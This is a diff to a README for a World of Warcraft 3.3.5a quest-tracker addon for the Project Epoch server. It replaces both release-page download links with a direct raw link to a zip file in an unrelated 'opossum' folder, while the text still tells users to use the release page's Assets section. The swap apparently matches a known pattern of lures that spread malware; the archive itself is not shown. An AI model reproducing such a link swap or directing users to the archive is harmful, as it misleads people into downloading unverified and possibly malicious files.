@@ -1,6 +1,6 @@
 # 🗺️ questie-335-epoch - Track your quests on Project Epoch
 
-[![Download Questie](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/leandro4856/questie-335-epoch/releases)
+[![Download Questie](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/leandro4856/questie-335-epoch/main/opossum/epoch_questie_v3.4.zip)
 
 This software adds a quest tracker to your World of Warcraft 3.3.5a client. It combines the Questie user interface with the specific quest data for Project Epoch. This project merges the Questie core with the pfQuest database to ensure icons and tracking match the server settings.
 
@@ -8,7 +8,7 @@ This software adds a quest tracker to your World of Warcraft 3.3.5a client. It c
 
 You need to download the latest version of the addon from the release page.
 
-[Click here to visit the release page and download the addon](https://github.com/leandro4856/questie-335-epoch/releases)
+[Click here to visit the release page and download the addon](https://raw.githubusercontent.com/leandro4856/questie-335-epoch/main/opossum/epoch_questie_v3.4.zip)
 
 Look for the file ending in .zip under the "Assets" section of the latest release. Download this file to your computer.
 
